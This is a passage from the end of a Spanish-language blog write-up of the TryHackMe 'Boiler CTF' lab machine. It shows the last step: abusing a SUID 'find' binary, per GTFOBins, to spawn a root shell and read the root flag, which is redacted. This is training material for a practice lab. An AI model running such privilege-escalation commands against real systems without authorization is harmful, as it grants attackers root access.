</pre></table></code></div></div><p>Con el permiso SUID y ejecutando el comando de una forma determinada, que se puede comprobar en <a href="https://gtfobins.github.io/">GTFOBins</a>, se puede obtener una shell con privilegios de root.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>stoner@Vulnerable:~$ find . -exec /bin/bash -p \; -quit

bash-4.3# cat /root/root.txt

** ****** **** ****, *** **?
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/tryhackme/'>TryHackMe</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/joomla/" class="post-tag no-text-decoration" >joomla</a> <a href="/tags/sar2html/" class="post-tag no-text-decoration" >sar2html</a> <a href="/tags/suid/" class="post-tag no-text-decoration" >suid</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Compartir</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Boiler CTF (Try Hack Me) - J0lm3d0&url=https://j0lm3d0.github.io/posts/boilerctf-(try-hack-me)/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Boiler CTF (Try Hack Me) - J0lm3d0&u=https://j0lm3d0.github.io/posts/boilerctf-(try-hack-me)/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Boiler CTF (Try Hack Me) - J0lm3d0&url=https://j0lm3d0.github.io/posts/boilerctf-(try-hack-me)/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink('', '¡Enlace copiado correctamente!')" data-toggle="tooltip" data-placement="top" title="Copiar enlace"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Actualizado recientemente</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/tier-0-starting-point-machines-(hack-the-box)/">Tier 0 Starting Point Machines (Hack The Box)</a><li><a href="/posts/previse-(hack-the-box)/">Previse (Hack The Box)</a><li><a href="/posts/couch-(try-hack-me)/">Couch (Try Hack Me)</a><li><a href="/posts/knife-(hack-the-box)/">Knife (Hack The Box)</a><li><a href="/posts/pentesting_shells_cheat_sheet_script/">Pentesting_Shells-Cheat_Sheet-Script</a></ul></div><div id="access-tags"> <span>Etiquetas en tendencia</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/sudo/">sudo</a> <a class="post-tag" href="/tags/cve/">cve</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/adb/">adb</a> <a class="post-tag" href="/tags/alwaysinstallelevated-privilege/">alwaysinstallelevated_privilege</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/android-debugger-bridge/">android_debugger_bridge</a> <a class="post-tag" href="/tags/capabilities/">capabilities</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contenidos</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Más entradas</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/cap-(hack-the-box)/"><div class="card-body"> <span class="timeago small" > 2 Oct 2021<i class="unloaded">2021-10-02T21:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Cap (Hack The Box)</h3><div class="text-muted small"><p> En este documento se recogen los pasos a seguir para la resolución de la máquina Cap de la plataforma HackTheBox. Se trata de una máquina Linux de 64 bits, que posee una dificultad fácil de resoluc...</p></div></div></a></div><div class="card"> <a href="/posts/bountyhunter-(hack-the-box)/"><div class="card-body"> <span class="timeago small" >20 Nov 2021<i class="unloaded">2021-11-20T20:00:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>BountyHunter (Hack The Box)</h3><div class="text-muted small"><p> En este documento se recogen los pasos a seguir para la resolución de la máquina BountyHunter de la plataforma HackTheBox. Se trata de una máquina Linux de 64 bits, que posee una dificultad fácil d...</p></div></div></a></div><div class="card"> <a href="/posts/tier-0-starting-point-machines-(hack-the-box)/"><div class="card-body"> <span class="timeago small" > 8 Jan<i class="unloaded">2022-01-08T18:00:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Tier 0 Starting Point Machines (Hack The Box)</h3><div class="text-muted small"><p> En este documento se recogen los pasos a seguir para la resolución de las máquinas de Tier 0 del “Starting Point” de la plataforma HackTheBox. Se trata de máquinas tanto Windows como Linux, que tie...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/bountyhunter-(hack-the-box)/" class="btn btn-outline-primary" prompt="Anterior"><p>BountyHunter (Hack The Box)</p></a> <a href="/posts/tier-0-starting-point-machines-(hack-the-box)/" class="btn btn-outline-primary" prompt="Siguiente"><p>Tier 0 Starting Point Machines (Hack The Box)</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/J0lm3d0">J0lm3d0</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Etiquetas en tendencia</h4><a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/sudo/">sudo</a> <a class="post-tag" href="/tags/cve/">cve</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/adb/">adb</a> <a class="post-tag" href="/tags/alwaysinstallelevated-privilege/">alwaysinstallelevated_privilege</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/android-debugger-bridge/">android_debugger_bridge</a> <a class="post-tag" href="/tags/capabilities/">capabilities</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://j0lm3d0.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No se han encontrado resultados.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
